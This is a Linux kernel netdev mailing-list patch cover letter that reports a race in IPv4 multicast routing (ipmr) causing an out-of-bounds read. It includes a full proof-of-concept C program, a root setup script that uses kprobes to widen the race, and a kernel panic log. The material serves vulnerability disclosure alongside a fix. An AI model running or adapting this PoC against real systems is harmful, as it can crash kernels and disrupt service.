Received: from mail-pl1-f181.google.com (mail-pl1-f181.google.com [209.85.214.181])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8114051CF54
	for <netdev@vger.kernel.org>; Tue, 13 Oct 2026 14:34:09 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.214.181
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1791902052; cv=none; b=FigPJAdYDqsfxzb1s4cp3/IttiIJ5Iyvu5gyiC38U00rlKKQ+iRnMWEfhNSMU8wAqOyLHFwUvXtDiXNOPmklpeFED0HbhHepPRF5Fhon339NwrHc13WXkBUhyL/1bJpSn3GomTJtetlE2p2AxrjJ8zVDcGEGOVn+wF1eJ6CFMj0=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1791902052; c=relaxed/simple;
	bh=u+F8lOIJ7voKzXFK/Mq3Q9EtTJvs4kkyD612MYluzqg=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=dwjBs5oLseXXgK3p6w7usN9dIfqeB1QmNzEelLvxGH4c8llVGSAviWZhaVeRhhfZeiAo6Z1qN0FJwEwu91gZYbk/2oy2ewZ1mAHa1cU8SB4mpQqZHX0zvttGOQcGsoJB8gruafQrkCUOm6zpkUkSCj98CTw43qa4e1QvB4nQvCk=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=sS6k9tlU; arc=none smtp.client-ip=209.85.214.181
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="sS6k9tlU"
Received: by mail-pl1-f181.google.com with SMTP id d9443c01a7336-2e812e2b31bso16324375ad.3
        for <netdev@vger.kernel.org>; Tue, 13 Oct 2026 07:34:09 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1791902049; x=1792506849; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=AqB/Y0O05PVZz32MqAR9Z1wVWOJqRXj81dfWLrjiVIg=;
        b=sS6k9tlUoeVaA0upXcExS6S8jUP4tiaiWFtAqK4HBBFkLcIYRidu5UeXNYsHMChJce
         n+DENrJgX16ky0qYgMeUuBx4VizyKu2Zx+emn8uyJ2yliR008I+1X2/hd2W6aoAwkdXf
         desdCJdurezTjUAPyRmlAYvVf8BJVejFi1NpYU7/KEs3GJpDlxbTnut05lOGJB+nn9/6
         eBOZeVAFA0hQptd8E+EEVWklo8loH4KmWWWHPPnoJt87ec52Ej8aVU5qcJFJaBKaJcI+
         eq2owLwT6PjeI3N4AFZ/bmpKCNcxx5n6CscbnaujFcULxX6+InyZKPOPUWPQJ7OEMEYl
         sDLg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20260707; t=1791902049; x=1792506849;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=AqB/Y0O05PVZz32MqAR9Z1wVWOJqRXj81dfWLrjiVIg=;
        b=sBnbDcuEYsxrJZYXumqJoqgV36WErvpOoR5FayPL92LAR4Byea6EVJ6AdhlR+8njCU
         JwqBHlTroh9a6MXHEApvbtwVuBXHsVa+0ZKmCEu2MoXyzoDtIYgkef38l31R/KA0F4b0
         iGgpKPXN6Ly0g7ySPE2iXCOVn9QCJCjL8sgOZ4DWl0CkPM17EVwPS5IdH5WvRJX+GIy2
         q/bKD0cw0tsixLeN/hzU9InFulR/LLxQ4UIXZ4irhVoiYmgoz1BO8QV9c6qDCxIm0hHV
         yNNH6/VjuXkz3vLCMPesboZFe/w21UktdLL+L6O7OaefpoHlJHIzkogXbcMGrB4Tg090
         7YEw==
X-Gm-Message-State: AFq9FYLmvvoHsBFpDvWFJt6ozmTY+LFmsjjP0YqzvWRIT1YFUfGrFgsp
	i0+kZkEJZ/lqOtxRjfY+72zL7+8GZjnMy2iqZ796atuW7OQq/WmQOb2BgbbARsHUWRll075eYMH
	mzu2fSoz0V/U=
X-Gm-Gg: AYBFou3ypfYfek2LHV5Nbl0IPSHot674Vr0hY+JJq6O37waU6Y5UI6wBu1vF+D5Dc4c
	j/NPx81FY5gALVZ78jgGMq4lX59/hneWkUhOihk0MZYwWYuPWaz8TrI2qOfIaP6czTXn3HozRfX
	Jk1BHih/A8rWIpapMqCX12q7d/DpqVBPbwmVjASV4dgspgGTMzg61M5nPhPW5IVhjYduQW+vg34
	KPm0zgvCDw8/MYvH9BAhEdb+DsXyHzPGnKWfwAWfGDZDmZM74nYxOiwNhuOLPoq83USjZzpL+gF
	+C3s/TpBvYnuYPC09o0l79pPN31nBvLpBWiCFbhRfklxZL36PvZQVyvF7OoGB+L+//cc1wCNpaA
	B/xPDp6Ob9qKx94exp+jF2wwh8vaN5xSr2VmtMnERKW/Ts99yqEyVv/Rr/uOIluAEbiISCUuhkf
	rqTsxZgVYkw/fc7AEr73RaDcVnepKXtK7SiFYd7zc/S0krfyZGkwL3yeo6NLIIfEnY2rXplNtdc
	69ijRU=
X-Received: by 2002:a17:902:f64f:b0:2e8:12dd:a9de with SMTP id d9443c01a7336-2e842cd96ecmr113349785ad.36.1791902048590;
        Tue, 13 Oct 2026 07:34:08 -0700 (PDT)
Received: from Roxy.sysu.edu.cn ([2602:feda:30:ae86:295:dff:fe84:68f4])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2e8421b0aa4sm56336355ad.35.2026.10.13.07.34.05
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Tue, 13 Oct 2026 07:34:08 -0700 (PDT)
From: Zhiling Zou <zhilinz@nebusec.ai>
To: netdev@vger.kernel.org
Cc: dsahern@kernel.org,
	idosch@nvidia.com,
	davem@davemloft.net,
	edumazet@kernel.org,
	pabeni@redhat.com,
	horms@kernel.org,
	vega@nebusec.ai,
	zhilinz@nebusec.ai
Subject: [PATCH net 0/1] ipmr: validate VIF indexes before offload lookup
Date: Tue, 13 Oct 2026 22:33:56 +0800
Message-ID: <cover.1791899747.git.zhilinz@nebusec.ai>
X-Mailer: git-send-email 2.55.0
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv4/ipmr.c. The bug is reachable
by a root user configuring IPv4 multicast routing and racing VIF updates
with packet forwarding.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

ipmr_mfc_add() accepts a multicast forwarding cache entry whose parent
VIF does not yet exist. During vif_add(), the VIF device pointer is
published before mrt->maxvif is increased. A concurrent packet can make
ipmr_find_vif() observe the old maxvif and return -1, while the parent
VIF's published device passes the ingress-device check.

Forwarding then calls ipmr_forward_offloaded() with in_vifi == -1. The
helper forms a pointer to mrt->vif_table[in_vifi] before checking the
packet's offload mark, so the negative index produces an out-of-bounds
read. The PoC races VIF 31 publication with multicast ingress; its
kprobes widen the race window. UBSAN reports the invalid index in the
ipmr_queue_xmit() path.

Validate both VIF indexes before forming pointers into vif_table. Invalid
indexes now continue through the regular software forwarding path.

Reproducer:

    sh ./poc.sh 120

The PoC was run as root in a 2 vCPU, 2 GB x86 QEMU guest using the
provided Linux 6.12.95 build and configuration.

------BEGIN poc.c------

    #define _GNU_SOURCE

    #include <arpa/inet.h>
    #include <errno.h>
    #include <linux/mroute.h>
    #include <net/if.h>
    #include <pthread.h>
    #include <sched.h>
    #include <signal.h>
    #include <stdbool.h>
    #include <stdint.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <sys/ioctl.h>
    #include <sys/socket.h>
    #include <sys/sysinfo.h>
    #include <sys/types.h>
    #include <time.h>
    #include <unistd.h>

    #define GROUP_ADDR "239.1.1.1"
    #define SRC_ADDR "10.0.0.2"

    #define IN_DEV "vifin"
    #define OUT_DEV "vifout"
    #define SRC_DEV "src0"

    #define IN_VIFI 31
    #define OUT_VIFI 30
    #define UDP_PORT 5000
    #define BATCH 64

    static volatile sig_atomic_t stop_flag;
    static int mroute_fd = -1;
    static int src_ifindex;
    static int in_ifindex;
    static int out_ifindex;

    static volatile unsigned long long adds_done;
    static volatile unsigned long long dels_done;
    static void on_signal(int sig)
    {
    	(void)sig;
    	stop_flag = 1;
    }

    static void bind_to_cpu(int cpu)
    {
    	cpu_set_t set;
    	int ncpu = get_nprocs();

    	if (ncpu <= 0)
    		return;

    	CPU_ZERO(&set);
    	CPU_SET(cpu % ncpu, &set);
    	pthread_setaffinity_np(pthread_self(), sizeof(set), &set);
    }

    static void fatal(const char *what)
    {
    	fprintf(stderr, "fatal: %s: %s\n", what, strerror(errno));
    	exit(EXIT_FAILURE);
    }

    static int vif_op(int optname, vifi_t vifi, int ifindex)
    {
    	struct vifctl vif = {
    		.vifc_vifi = vifi,
    		.vifc_flags = VIFF_USE_IFINDEX,
    		.vifc_threshold = 1,
    		.vifc_rate_limit = 0,
    		.vifc_lcl_ifindex = ifindex,
    	};

    	return setsockopt(mroute_fd, IPPROTO_IP, optname, &vif, sizeof(vif));
    }

    static void add_vif_checked(vifi_t vifi, int ifindex)
    {
    	if (vif_op(MRT_ADD_VIF, vifi, ifindex) < 0)
    		fatal("MRT_ADD_VIF");
    }

    static void del_vif_best_effort(vifi_t vifi, int ifindex)
    {
    	if (vif_op(MRT_DEL_VIF, vifi, ifindex) < 0 &&
    	    errno != EADDRNOTAVAIL)
    		fatal("MRT_DEL_VIF");
    }

    static void add_mfc_checked(void)
    {
    	struct mfcctl mfc;

    	memset(&mfc, 0, sizeof(mfc));
    	if (!inet_aton(SRC_ADDR, &mfc.mfcc_origin))
    		exit(EXIT_FAILURE);
    	if (!inet_aton(GROUP_ADDR, &mfc.mfcc_mcastgrp))
    		exit(EXIT_FAILURE);

    	mfc.mfcc_parent = IN_VIFI;
    	memset(mfc.mfcc_ttls, 255, sizeof(mfc.mfcc_ttls));
    	mfc.mfcc_ttls[OUT_VIFI] = 1;

    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_ADD_MFC, &mfc, sizeof(mfc)) < 0)
    		fatal("MRT_ADD_MFC");
    }

    static void flush_tables(void)
    {
    	int flags = MRT_FLUSH_MFC | MRT_FLUSH_MFC_STATIC |
    		    MRT_FLUSH_VIFS | MRT_FLUSH_VIFS_STATIC;

    	if (mroute_fd >= 0)
    		setsockopt(mroute_fd, IPPROTO_IP, MRT_FLUSH, &flags, sizeof(flags));
    }

    static int get_mfc_pktcnt(unsigned long *pktcnt)
    {
    	struct sioc_sg_req req;

    	memset(&req, 0, sizeof(req));
    	if (!inet_aton(SRC_ADDR, &req.src))
    		return -1;
    	if (!inet_aton(GROUP_ADDR, &req.grp))
    		return -1;
    	if (ioctl(mroute_fd, SIOCGETSGCNT, &req) < 0)
    		return -1;

    	*pktcnt = req.pktcnt;
    	return 0;
    }

    static void selftest_forwarding(void)
    {
    	unsigned long before = 0;
    	unsigned long after = 0;
    	int tries;

    	fprintf(stderr, "[*] self-test: add input VIF and verify multicast forwarding\n");
    	add_vif_checked(IN_VIFI, in_ifindex);
    	if (get_mfc_pktcnt(&before) < 0)
    		fatal("SIOCGETSGCNT(before)");

    	for (tries = 0; tries < 30; tries++) {
    		usleep(100000);
    		if (get_mfc_pktcnt(&after) < 0)
    			fatal("SIOCGETSGCNT(after)");
    		if (after > before)
    			break;
    	}
    	if (after <= before) {
    		fprintf(stderr, "fatal: self-test did not advance MFC packet counters\n");
    		exit(EXIT_FAILURE);
    	}

    	fprintf(stderr, "[+] self-test passed: MFC packets %lu -> %lu\n", before, after);
    	del_vif_best_effort(IN_VIFI, in_ifindex);
    }

    static int make_sender_socket(void)
    {
    	int fd;
    	struct sockaddr_in bind_addr = {
    		.sin_family = AF_INET,
    		.sin_port = htons(0),
    	};
    	struct ip_mreqn ifreq = { .imr_ifindex = src_ifindex };
    	unsigned char ttl = 64;

    	fd = socket(AF_INET, SOCK_DGRAM, 0);
    	if (fd < 0)
    		fatal("socket(sender)");

    	if (!inet_aton(SRC_ADDR, &bind_addr.sin_addr))
    		exit(EXIT_FAILURE);

    	if (setsockopt(fd, SOL_SOCKET, SO_BINDTODEVICE, SRC_DEV, sizeof(SRC_DEV)) < 0)
    		fatal("SO_BINDTODEVICE(sender)");
    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_IF, &ifreq, sizeof(ifreq)) < 0)
    		fatal("IP_MULTICAST_IF(sender)");
    	if (setsockopt(fd, IPPROTO_IP, IP_MULTICAST_TTL, &ttl, sizeof(ttl)) < 0)
    		fatal("IP_MULTICAST_TTL(sender)");
    	if (bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr)) < 0)
    		fatal("bind(sender)");

    	return fd;
    }

    static int sender_main(int seconds)
    {
    	int fd = make_sender_socket();
    	struct sockaddr_in dst = {
    		.sin_family = AF_INET,
    		.sin_port = htons(UDP_PORT),
    	};
    	struct iovec iov[BATCH];
    	struct mmsghdr msgs[BATCH];
    	char payload[128];
    	int i;

    	signal(SIGINT, on_signal);
    	signal(SIGTERM, on_signal);
    	signal(SIGALRM, on_signal);
    	alarm(seconds);

    	if (!inet_aton(GROUP_ADDR, &dst.sin_addr))
    		exit(EXIT_FAILURE);

    	memset(payload, 0x42, sizeof(payload));
    	memset(msgs, 0, sizeof(msgs));
    	for (i = 0; i < BATCH; i++) {
    		iov[i].iov_base = payload;
    		iov[i].iov_len = sizeof(payload);
    		msgs[i].msg_hdr.msg_name = &dst;
    		msgs[i].msg_hdr.msg_namelen = sizeof(dst);
    		msgs[i].msg_hdr.msg_iov = &iov[i];
    		msgs[i].msg_hdr.msg_iovlen = 1;
    	}

    	while (!stop_flag) {
    		int ret = sendmmsg(fd, msgs, BATCH, 0);

    		if (ret > 0)
    			continue;
    		if (ret < 0 && (errno == EINTR || errno == ENOBUFS))
    			continue;
    		fatal("sendmmsg(sender)");
    	}

    	close(fd);
    	return EXIT_SUCCESS;
    }

    static void *toggle_thread(void *arg)
    {
    	int cpu = (int)(intptr_t)arg;

    	bind_to_cpu(cpu);
    	while (!stop_flag) {
    		if (vif_op(MRT_ADD_VIF, IN_VIFI, in_ifindex) == 0) {
    			__sync_fetch_and_add(&adds_done, 1);
    		} else if (errno != EADDRINUSE) {
    			fatal("MRT_ADD_VIF(loop)");
    		}

    		if (vif_op(MRT_DEL_VIF, IN_VIFI, in_ifindex) == 0) {
    			__sync_fetch_and_add(&dels_done, 1);
    		} else if (errno != EADDRNOTAVAIL) {
    			fatal("MRT_DEL_VIF(loop)");
    		}
    	}

    	return NULL;
    }

    static int race_main(int seconds)
    {
    	int mrt_init = 1;
    	pthread_t toggler;
    	time_t start;

    	signal(SIGINT, on_signal);
    	signal(SIGTERM, on_signal);
    	signal(SIGALRM, on_signal);

    	in_ifindex = if_nametoindex(IN_DEV);
    	out_ifindex = if_nametoindex(OUT_DEV);
    	if (!in_ifindex || !out_ifindex) {
    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
    			IN_DEV, OUT_DEV);
    		return EXIT_FAILURE;
    	}

    	mroute_fd = socket(AF_INET, SOCK_RAW, IPPROTO_IGMP);
    	if (mroute_fd < 0)
    		fatal("socket(AF_INET, SOCK_RAW, IPPROTO_IGMP)");
    	if (setsockopt(mroute_fd, IPPROTO_IP, MRT_INIT, &mrt_init, sizeof(mrt_init)) < 0)
    		fatal("MRT_INIT");

    	flush_tables();
    	add_vif_checked(OUT_VIFI, out_ifindex);
    	add_mfc_checked();
    	selftest_forwarding();

    	fprintf(stderr, "[*] racing VIF publication against multicast ingress for up to %d seconds\n",
    		seconds);
    	alarm(seconds);
    	start = time(NULL);

    	if (pthread_create(&toggler, NULL, toggle_thread, (void *)(intptr_t)0) != 0)
    		fatal("pthread_create(toggler)");

    	while (!stop_flag) {
    		unsigned long pktcnt = 0;

    		sleep(1);
    		if (get_mfc_pktcnt(&pktcnt) < 0)
    			pktcnt = 0;
    		fprintf(stderr,
    			"[*] %lds mfc_pktcnt=%lu add=%llu del=%llu\n",
    			(long)(time(NULL) - start),
    			pktcnt, adds_done, dels_done);
    	}

    	fprintf(stderr, "[*] stopping without observed crash\n");
    	pthread_join(toggler, NULL);

    	flush_tables();
    	setsockopt(mroute_fd, IPPROTO_IP, MRT_DONE, &mrt_init, sizeof(mrt_init));
    	close(mroute_fd);
    	return EXIT_SUCCESS;
    }

    int main(int argc, char **argv)
    {
    	int seconds = 300;

    	if (argc > 2)
    		seconds = atoi(argv[2]);
    	else if (argc > 1 && strcmp(argv[1], "sender") != 0)
    		seconds = atoi(argv[1]);
    	if (seconds <= 0)
    		seconds = 300;

    	src_ifindex = if_nametoindex(SRC_DEV);
    	in_ifindex = if_nametoindex(IN_DEV);
    	out_ifindex = if_nametoindex(OUT_DEV);

    	if (argc > 1 && strcmp(argv[1], "sender") == 0) {
    		src_ifindex = if_nametoindex(SRC_DEV);
    		if (!src_ifindex) {
    			fprintf(stderr, "fatal: missing sender interface %s\n", SRC_DEV);
    			return EXIT_FAILURE;
    		}
    		return sender_main(seconds);
    	}

    	if (!in_ifindex || !out_ifindex) {
    		fprintf(stderr, "fatal: missing expected interfaces (%s, %s)\n",
    			IN_DEV, OUT_DEV);
    		return EXIT_FAILURE;
    	}

    	return race_main(seconds);
    }

------END poc.c--------

------BEGIN poc.sh------

    #!/bin/sh
    set -eu

    cd "$(dirname "$0")"

    cleanup() {
    	if [ -e /sys/kernel/debug/tracing/events/kprobes/enable ]; then
    		echo 0 >/sys/kernel/debug/tracing/events/kprobes/enable
    	fi
    	if [ -e /sys/kernel/debug/tracing/kprobe_events ]; then
    		echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    		echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    	fi
    	ip netns del ns_src 2>/dev/null || true
    	ip link del vifin 2>/dev/null || true
    	ip link del vifout 2>/dev/null || true
    }

    trap cleanup EXIT
    cleanup

    ip link add vifin type veth peer name src0
    ip link add vifout type veth peer name sink0

    ip netns add ns_src
    ip link set src0 netns ns_src

    ip addr add 10.0.0.1/24 dev vifin
    ip addr add 10.0.1.1/24 dev vifout
    ip addr add 10.0.1.2/24 dev sink0

    ip link set vifin up
    ip link set vifout up
    ip link set sink0 up

    ip -n ns_src addr add 10.0.0.2/24 dev src0
    ip -n ns_src link set lo up
    ip -n ns_src link set src0 up

    sysctl -q -w net.ipv4.ip_forward=1
    sysctl -q -w net.ipv4.conf.all.rp_filter=0
    sysctl -q -w net.ipv4.conf.default.rp_filter=0
    sysctl -q -w net.ipv4.conf.vifin.rp_filter=0
    sysctl -q -w net.ipv4.conf.vifout.rp_filter=0
    sysctl -q -w net.ipv4.conf.sink0.rp_filter=0

    mount -t debugfs none /sys/kernel/debug 2>/dev/null || true
    echo '-:ipmr_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    echo '-:ipmr_find_hold' >/sys/kernel/debug/tracing/kprobe_events 2>/dev/null || true
    echo 'p:ipmr_hold vif_add+0x496' >/sys/kernel/debug/tracing/kprobe_events
    echo 'p:ipmr_find_hold ip_mr_forward+0x35' >/sys/kernel/debug/tracing/kprobe_events
    echo 1 >/sys/kernel/debug/tracing/events/kprobes/enable

    make clean >/dev/null 2>&1 || true
    make

    duration="${1:-300}"
    taskset -c 1 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.1.log 2>&1 &
    pid1=$!
    taskset -c 2 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.2.log 2>&1 &
    pid2=$!
    taskset -c 3 ip netns exec ns_src ./poc sender "$duration" >/tmp/ipmr-sender.3.log 2>&1 &
    pid3=$!

    trap 'kill "$pid1" "$pid2" "$pid3" 2>/dev/null || true; cleanup' EXIT
    exec ./poc race "$duration"

------END poc.sh--------

----BEGIN crash log----

[   67.164888] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
[   67.165410] CPU: 1 UID: 0 PID: 1016 Comm: poc Not tainted 6.12.95 #1
[   67.165883] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[   67.166689] Call Trace:
[   67.166867]  <IRQ>
[   67.167077]  panic+0x352/0x3e0
[   67.167313]  ? _printk+0x64/0x80
[   67.167614]  check_panic_on_warn+0x44/0x60
[   67.168007]  __ubsan_handle_out_of_bounds+0xe7/0x100
[   67.168452]  ipmr_queue_xmit+0x6e1/0x730
[   67.168907]  ip_mr_input+0xf3/0x460
[   67.169450]  __netif_receive_skb_one_core+0x89/0xa0
[   67.170312]  process_backlog+0x99/0x1b0
[   67.171034]  __napi_poll+0x28/0x1b0
[   67.171564]  net_rx_action+0x197/0x370
[   67.172145]  handle_softirqs+0xe6/0x300
[   67.172723]  do_softirq.part.0+0x3b/0x60
[   67.173412]  </IRQ>
[   67.173733]  <TASK>
[   67.174200]  __local_bh_enable_ip+0x4f/0x60
[   67.174989]  __dev_queue_xmit+0x372/0xe60
[   67.175487]  ? ip_generic_getfrag+0x63/0xf0
[   67.176028]  ? srso_alias_return_thunk+0x5/0xfbef5
[   67.176746]  ? __ip_append_data+0xc9b/0x13a0
[   67.177601]  ? __pfx_ip_generic_getfrag+0x10/0x10
[   67.178369]  ip_finish_output2+0x268/0x540
[   67.179085]  ip_output+0x5d/0xe0
[   67.179702]  ? __pfx_ip_finish_output+0x10/0x10
[   67.180402]  ip_send_skb+0x86/0x90
[   67.180960]  udp_send_skb+0x18e/0x360
[   67.181678]  udp_sendmsg+0xb31/0xe40
[   67.182282]  ? __pfx_ip_generic_getfrag+0x10/0x10
[   67.182854]  ? ____sys_sendmsg+0x2e8/0x310
[   67.183361]  ____sys_sendmsg+0x2e8/0x310
[   67.183856]  ? copy_msghdr_from_user+0x7d/0xc0
[   67.184574]  ___sys_sendmsg+0x9a/0xe0
[   67.185177]  ? __schedule+0x47e/0x1450
[   67.185749]  __sys_sendmmsg+0xfa/0x210
[   67.186323]  __x64_sys_sendmmsg+0x21/0x30
[   67.187067]  do_syscall_64+0x58/0x120
[   67.187630]  entry_SYSCALL_64_after_hwframe+0x76/0x7e
[   67.188274] RIP: 0033:0x7f22ef597687
[   67.188698] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[   67.191292] RSP: 002b:00007ffc261b1d80 EFLAGS: 00000202 ORIG_RAX: 0000000000000133
[   67.192314] RAX: ffffffffffffffda RBX: 00007f22ef505740 RCX: 00007f22ef597687
[   67.193303] RDX: 0000000000000040 RSI: 00007ffc261b2260 RDI: 0000000000000003
[   67.194295] RBP: 00007ffc261b1de0 R08: 0000000000000000 R09: 0000000000000000
[   67.195124] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000003
[   67.195990] R13: 00007ffc261b2260 R14: 0000000000000078 R15: 000057fc757db880
[   67.197089]  </TASK>
[   67.198132] Kernel Offset: disabled

-----END crash log-----

Best regards,
Zhiling Zou

Zhiling Zou (1):
  ipmr: validate VIF indexes before offload lookup

 net/ipv4/ipmr.c | 9 +++++++--
 1 file changed, 7 insertions(+), 2 deletions(-)

-- 
2.55.0

